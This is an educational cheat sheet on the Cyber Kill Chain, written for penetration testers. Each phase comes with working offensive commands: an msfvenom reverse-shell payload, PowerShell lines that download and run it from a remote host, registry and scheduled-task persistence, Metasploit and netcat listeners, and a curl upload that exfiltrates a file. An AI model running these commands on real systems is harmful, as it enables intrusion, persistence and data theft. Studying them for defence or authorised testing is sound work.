# Cyber Kill Chain Cheat Sheet

This cheat sheet provides an in-depth guide to the **Cyber Kill Chain** phases, with sample commands and scripts illustrating each phase. This is intended for ethical hackers and security enthusiasts to understand the tactics used at each stage. Only execute these commands in a lab environment or with proper authorization for penetration testing.

---

## 1. Reconnaissance

The **Reconnaissance** phase involves gathering information about the target's infrastructure, personnel, and systems. This is a critical stage where attackers collect as much data as possible to increase their chances of successful exploitation.

### Tools & Commands

- **Whois**: For domain and ownership information.
- **Nslookup**: To identify DNS records and subdomains.
- **theHarvester**: A tool to gather emails, subdomains, and employee names from public sources.

### Examples

```bash
# Whois query for domain information
whois targetdomain.com

# DNS lookup to discover nameservers and mail servers
nslookup -type=ns targetdomain.com
nslookup -type=mx targetdomain.com

# Gather subdomains, emails, and names using theHarvester
theHarvester -d targetdomain.com -b google -f target_recon_report
```

This phase may also include **Google Dorking**, social media scraping, and OSINT (Open-Source Intelligence) tools like **Maltego**.

---

## 2. Weaponization

**Weaponization** involves creating a malicious payload tailored to exploit vulnerabilities identified during Reconnaissance. Payloads are crafted to perform specific tasks such as opening a reverse shell, executing code, or logging keystrokes.

### Tools & Commands

- **msfvenom**: A payload generator to create exploits for various platforms.
- **Social-Engineer Toolkit (SET)**: To craft phishing emails or other delivery methods.

### Examples

```bash
# Generate a reverse shell payload for Windows using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o malicious_payload.exe
```

This payload, `malicious_payload.exe`, will create a reverse shell back to the attacker's machine.

---

## 3. Delivery

In the **Delivery** phase, attackers deliver the malicious payload to the target. Common methods include phishing emails, USB drops, or compromising trusted websites.

### Tools & Commands

- **Social-Engineer Toolkit (SET)**: For creating and sending phishing campaigns.
- **Custom PowerShell and Batch Scripts**: Used to download and execute payloads.

### Examples

Using SET for spear-phishing:

```bash
# Launch SET
setoolkit

# Navigate: Social Engineering Attacks > Spear Phishing Attack Vectors > Mass Email Attack
# Follow prompts to customize the email message, attachment, and recipient list.
```

Alternatively, deliver payloads via **direct PowerShell execution**:

```powershell
# PowerShell command to download and execute payload
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://192.168.1.10/malicious_payload.exe", "C:\\Users\\Public\\malicious_payload.exe")
Start-Process "C:\\Users\\Public\\malicious_payload.exe"
```

This PowerShell command downloads and executes the payload on the target system.

---

## 4. Exploitation

In the **Exploitation** phase, attackers exploit a vulnerability to execute the payload, gaining access to the target system. This might involve social engineering, exploiting software vulnerabilities, or bypassing application security controls.

### Tools & Commands

- **Metasploit Framework**: For automating exploits.
- **Custom Scripts**: Such as PowerShell for executing payloads directly.

### Examples

Executing a payload using PowerShell:

```powershell
# Download and execute malicious payload
Invoke-WebRequest -Uri "http://192.168.1.10/malicious_payload.exe" -OutFile "C:\\Users\\Public\\malicious_payload.exe"
Start-Process "C:\\Users\\Public\\malicious_payload.exe"
```

Or exploit web vulnerabilities using **SQL Injection, XSS,** or **file upload exploits** to compromise the target.

---

## 5. Installation

**Installation** ensures persistence, allowing the attacker to retain access to the system even after a reboot. Attackers often add their payload to startup scripts, services, or scheduled tasks.

### Tools & Commands

- **Registry Keys**: To create persistence.
- **Scheduled Tasks**: To run malware on boot.

### Examples

Using Windows Registry for persistence:

```powershell
# Add a registry key for persistence
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "Updater" -Value "C:\Users\Public\malicious_payload.exe"
```

Or, using **Scheduled Tasks** in Windows:

```bash
schtasks /create /tn "Updater" /tr "C:\Users\Public\malicious_payload.exe" /sc onlogon
```

---

## 6. Command and Control (C2)

During **Command and Control (C2)**, attackers communicate with the compromised system, sending commands and receiving data. Attackers use various protocols (HTTP, HTTPS, DNS) to maintain communication without detection.

### Tools & Commands

- **Metasploit**: For creating a C2 listener.
- **netcat**: A simple tool to establish a backdoor.

### Examples

Setting up a C2 listener with Metasploit:

```bash
# Launch Metasploit console
msfconsole

# Set up a handler to listen for reverse shells
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run
```

Or using `netcat` to open a simple backdoor:

```bash
# Open a listener with netcat
nc -lvp 4444
```

---

## 7. Actions on Objectives

**Actions on Objectives** is the final phase, where attackers achieve their goals, such as data exfiltration, privilege escalation, or lateral movement within the network. This is the phase where the actual harm occurs, whether it's stealing data, installing ransomware, or modifying files.

### Tools & Commands

- **curl**: To exfiltrate data via HTTP POST.
- **meterpreter**: To download files directly from compromised systems.

### Examples

Exfiltrating data with `curl`:

```bash
# Sending a sensitive file to a remote server
curl -X POST -F "file=@/path/to/sensitive_data.txt" http://192.168.1.10/upload.php
```

Or, downloading data with `meterpreter`:

```bash
# From within a meterpreter session
meterpreter > download C:\sensitive_data.txt /path/to/local/download/
```

Alternatively, attackers may attempt **lateral movement** with SMB or RDP, or perform **privilege escalation** using tools like **WinPEAS** or **linpeas**.

---

## Summary of Each Phase

| Phase                     | Description                                                | Example Tools             |
|---------------------------|------------------------------------------------------------|----------------------------|
| **Reconnaissance**        | Collect information on the target                          | `whois`, `nslookup`, `theHarvester` |
| **Weaponization**         | Create a malicious payload                                 | `msfvenom`, `SET`          |
| **Delivery**              | Deliver the payload to the target                          | `SET`, phishing emails     |
| **Exploitation**          | Execute the payload                                        | `PowerShell`, `Metasploit` |
| **Installation**          | Establish persistence                                      | `Registry`, `schtasks`     |
| **Command and Control**   | Communicate with the compromised system                    | `Metasploit`, `netcat`     |
| **Actions on Objectives** | Achieve final goals, like data theft or network access     | `meterpreter`, `curl`      |

---

> **Disclaimer**: This guide is intended for educational purposes and should only be used in authorized environments, such as penetration testing engagements or controlled labs.
```
